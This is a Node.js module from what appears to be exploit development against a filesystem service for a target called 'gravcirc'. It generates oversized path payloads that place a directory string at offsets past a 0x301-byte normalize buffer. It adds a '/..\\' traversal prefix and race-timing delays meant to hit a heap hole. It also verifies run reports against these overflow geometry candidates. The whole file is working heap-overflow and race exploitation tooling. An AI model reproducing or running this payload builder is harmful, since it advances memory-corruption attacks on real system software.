'use strict';

const crypto = require('node:crypto');

// The original GetEntryType normalize helper allocates 0x301 bytes. The live
// Gravity Circuit threshold run accepted one 0x800-byte X descriptor and
// rejected 0x801. 0x340 is 0x3f bytes past the helper's 0x301-byte buffer,
// aligned to 0x20, leaving one alignment unit beyond the first 0x320 boundary
// as a candidate for allocator bookkeeping.
// This is a bounded geometry candidate, not a measured FS heap address.
const NORMALIZE_BUFFER_BYTES = 0x301;
const X_DESCRIPTOR_BYTES = 0x800;
const OFFSET = 0x340;
// The original 0x2340/0x2440 layout leaves 0x100 bytes between the selected
// directory start and the terminator. A 0x7ff terminator with this aligned
// 0x700 placement leaves 0xff bytes, preserving that trailing-path geometry
// within one accepted X descriptor. The FS victim address is still unmeasured.
const TAIL_SPACING_OFFSET = 0x700;
// 0x7c0 leaves the owned 31-byte directory wholly within the accepted X
// descriptor, with 33 bytes to spare for the measured scratch-name format.
// It tests the far end of that descriptor; it is not a measured victim offset.
const EDGE_OFFSET = 0x7c0;
const REFERENCE_OFFSET = 0x2340;
const FILL_SEGMENT_BYTES = 0xf0;
// XH9FZg's 0.7 ms matched absent controls ended only 110–130 us after guard1
// started and were aborted by minimumSpacing=1. A 0.4 ms later hole start is
// a bounded timing candidate to keep the hole unfinished at the trigger's
// decision point. The live abort control must qualify it before any positive.
const PRIOR_HOLE_DELAY_NS = 700000;
const HOLE_DELAY_NS = 1100000;
const TIMING_DELAYS_NS = Object.freeze([HOLE_DELAY_NS]);

function expectedFirstX(scratch, slashSplit = false, offset = OFFSET,
  terminated = false) {
  if (typeof scratch !== 'string' || !/^\/NS2_GAP_\d+$/.test(scratch))
    throw Error('First-X diagnostic requires an owned scratch root');
  if (typeof slashSplit !== 'boolean')
    throw Error('First-X slash-split mode must be boolean');
  if (typeof terminated !== 'boolean' || terminated &&
      (!slashSplit || ![OFFSET, TAIL_SPACING_OFFSET].includes(offset)))
    throw Error('First-X terminated mode requires the bounded slash-split offset');
  if (![OFFSET, TAIL_SPACING_OFFSET, EDGE_OFFSET].includes(offset))
    throw Error('First-X offset is outside the bounded placement set');
  const selectedDirectory = scratch + '/selected';
  if (offset <= NORMALIZE_BUFFER_BYTES ||
      offset + Buffer.byteLength(selectedDirectory) >= X_DESCRIPTOR_BYTES)
    throw Error('First-X selected path does not fit the accepted descriptor');
  const bytes = Buffer.alloc(X_DESCRIPTOR_BYTES, 'B');
  bytes.write(selectedDirectory, offset, 'ascii');
  bytes.fill('/', offset + Buffer.byteLength(selectedDirectory));
  bytes.write('/..\\', 0, 'ascii');
  // Keep each filler component at most 0xf0 bytes while leaving the owned
  // selected-directory bytes and their offset unchanged. This is one variable
  // from the qualified unsplit miss, not a new heap placement claim.
  if (slashSplit)
    for (let at = FILL_SEGMENT_BYTES; at < offset; at += FILL_SEGMENT_BYTES + 1)
      bytes[at] = 0x2f;
  // The prior qualified split miss had '/' at 0x7ff and its only terminator
  // was in a separate tail request. This changes exactly one byte to match
  // the proven first-descriptor marker control's terminating position.
  if (terminated) bytes[X_DESCRIPTOR_BYTES - 1] = 0;
  return {bytes, selectedDirectory, offset};
}

function qualifyInput(payload, scratch, slashSplit = false, offset = OFFSET,
  terminated = false) {
  if (!Buffer.isBuffer(payload) || payload.length < X_DESCRIPTOR_BYTES + 1)
    throw Error('First-X positive payload is shorter than the accepted descriptor');
  const {bytes, selectedDirectory} = expectedFirstX(scratch, slashSplit, offset,
    terminated);
  const first = payload.subarray(0, X_DESCRIPTOR_BYTES);
  if (!first.equals(bytes))
    throw Error('First-X positive bytes differ from the bounded candidate');
  return {offset, normalizeBufferBytes: NORMALIZE_BUFFER_BYTES,
    xDescriptorBytes: X_DESCRIPTOR_BYTES, referenceOffset: REFERENCE_OFFSET,
    holeDelayNs: HOLE_DELAY_NS, priorHoleDelayNs: PRIOR_HOLE_DELAY_NS,
    fillSegmentBytes: slashSplit ? FILL_SEGMENT_BYTES : 0,
    terminatorOffset: terminated ? X_DESCRIPTOR_BYTES - 1 : null,
    selectedDirectory, firstDescriptorSha256: crypto.createHash('sha256')
      .update(first).digest('hex')};
}

function verifyEvidence(report, positiveCase) {
  const edge = report?.firstXEdgeOffsetEnabled === true;
  const tailSpacing = report?.firstXTailSpacingEnabled === true;
  const offset = tailSpacing ? TAIL_SPACING_OFFSET : edge ? EDGE_OFFSET : OFFSET;
  if (report?.firstXPositiveEnabled !== true || report.markerOffset !== offset ||
      report.extent !== 0x2440 || report.target !== 'gravcirc')
    throw Error('First-X positive mode or geometry differs');
  const slashSplit = report.firstXSlashSplitEnabled === true;
  const terminated = report.firstXTerminatedEnabled === true;
  if (report.firstXSlashSplitEnabled !== undefined &&
      typeof report.firstXSlashSplitEnabled !== 'boolean' ||
      report.firstXEdgeOffsetEnabled !== undefined &&
      typeof report.firstXEdgeOffsetEnabled !== 'boolean' ||
      report.firstXTerminatedEnabled !== undefined &&
      typeof report.firstXTerminatedEnabled !== 'boolean' ||
      report.firstXTailSpacingEnabled !== undefined &&
      typeof report.firstXTailSpacingEnabled !== 'boolean' ||
      edge && !slashSplit || terminated && (!slashSplit || edge) ||
      tailSpacing && (!terminated || edge))
    throw Error('First-X slash-split mode differs');
  const expected = expectedFirstX(report.scratch, slashSplit, offset, terminated);
  const evidence = report.firstXPositive;
  if (!evidence || evidence.offset !== offset ||
      evidence.normalizeBufferBytes !== NORMALIZE_BUFFER_BYTES ||
      evidence.xDescriptorBytes !== X_DESCRIPTOR_BYTES ||
      evidence.referenceOffset !== REFERENCE_OFFSET ||
      evidence.holeDelayNs !== HOLE_DELAY_NS ||
      evidence.priorHoleDelayNs !== PRIOR_HOLE_DELAY_NS ||
      (evidence.fillSegmentBytes ?? 0) !== (slashSplit ? FILL_SEGMENT_BYTES : 0) ||
      (evidence.terminatorOffset ?? null) !==
        (terminated ? X_DESCRIPTOR_BYTES - 1 : null) ||
      evidence.selectedDirectory !== expected.selectedDirectory)
    throw Error('First-X positive evidence differs from the owned candidate');
  if (positiveCase) {
    const hash = crypto.createHash('sha256').update(expected.bytes).digest('hex');
    if (evidence.firstDescriptorSha256 !== hash ||
        positiveCase.profile !== 'positive' ||
        positiveCase.firstXPositiveOffset !== offset ||
        terminated && positiveCase.pathTerminatorOffset !== X_DESCRIPTOR_BYTES - 1)
      throw Error('First-X positive input hash or wave offset differs');
  } else if (evidence.firstDescriptorSha256 !== null)
    throw Error('First-X positive input was recorded without a positive wave');
  return {variant: tailSpacing ? 'first-x-tail-spacing-terminated' :
    edge ? 'first-x-edge-slash-split' :
    terminated ? 'first-x-terminated-slash-split' :
      slashSplit ? 'first-x-slash-split' : 'first-x-positive', offset};
}

module.exports = {NORMALIZE_BUFFER_BYTES, X_DESCRIPTOR_BYTES, OFFSET,
  TAIL_SPACING_OFFSET, EDGE_OFFSET,
  REFERENCE_OFFSET, FILL_SEGMENT_BYTES, PRIOR_HOLE_DELAY_NS, HOLE_DELAY_NS, TIMING_DELAYS_NS,
  expectedFirstX, qualifyInput, verifyEvidence};
